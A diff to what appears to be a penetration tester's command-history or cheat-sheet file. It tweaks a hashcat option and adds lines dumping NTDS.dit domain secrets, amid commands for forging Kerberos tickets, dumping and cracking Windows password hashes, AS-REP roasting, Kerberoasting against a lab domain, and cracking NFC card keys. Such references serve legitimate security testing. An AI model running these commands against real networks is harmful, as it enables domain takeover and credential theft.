@@ -136,7 +136,7 @@ ticketer.py -nthash 0123456789krbtgtnthash0123456789 -domain-sid S-1-5-11-391295
 ticketer.py -nthash 01234567890sv01nthash01234567890 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD -spn HOST/SV01.BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
 secretsdump -k SV01.BREAKING.BAD
-hashcat --status -m 1000 --attack-mode 0 --username BREAKING.BAD.ntds `fzf-wordlists`
+hashcat --status --hash-type 1000 --attack-mode 0 --username BREAKING.BAD.ntds `fzf-wordlists`
 hashcat --hash-type 1000 --potfile-path BREAKING.BAD.ntds.cracked BREAKING.BAD.ntds --show --username
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt --kdcHost 192.168.56.101
@@ -247,3 +247,5 @@ libnfc_crypto1_crack a0a1a2a3a4a5 0 A 4 B
 mfoc -O original.dmp -k keys.txt
 nrf24-scanner.py -l -v
 jackit --reset --debug
+secretsdump -ntds ntds.dit.save -system system.save LOCAL
+gosecretsdump -ntds ntds.dit.save -system system.save
